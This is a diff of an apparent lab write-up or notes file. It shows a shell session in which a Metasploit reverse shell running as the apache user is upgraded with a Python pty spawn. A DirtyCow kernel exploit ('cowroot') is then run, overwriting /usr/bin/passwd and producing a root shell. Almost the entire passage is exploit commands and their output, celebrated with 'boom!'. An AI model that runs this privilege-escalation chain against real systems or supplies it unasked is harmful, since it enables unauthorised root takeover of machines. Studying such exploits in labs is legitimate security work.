@@ -237,23 +237,34 @@ I got it to work....
 
 on metasploit shell:
 
+[*] Command shell session 3 opened (10.0.2.15:32928 -> 10.0.2.2:52085) at 2017-07-16 20:32:29 -0600
 id
 uid=48(apache) gid=48(apache) groups=48(apache)
-gcc cowroot.c -o cowroot -pthread
+python -c 'import pty; pty.spawn("/bin/bash")'
+bash-4.2$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache) <-- upgrades "dumb" shell to pty shell (easier to work with)
+bash-4.2$ pwd
+pwd
+/tmp
+bash-4.2$ ls
 ls
-cowroot
-cowroot.c
+bak  cowroot  cowroot.c
+bash-4.2$ ./cowroot
 ./cowroot
 DirtyCow root privilege escalation
 Backing up /usr/bin/passwd.. to /tmp/bak
-Size of binary: 57048
+Size of binary: 27832
 Racing, this may take a while..
+thread stopped
 /usr/bin/passwd is overwritten
 Popping root shell.
 Don't forget to restore /tmp/bak
 thread stopped
+[root@samboxv2 tmp]# id                     
 id
 uid=0(root) gid=48(apache) groups=0(root),48(apache)
+
 
 boom! 
 
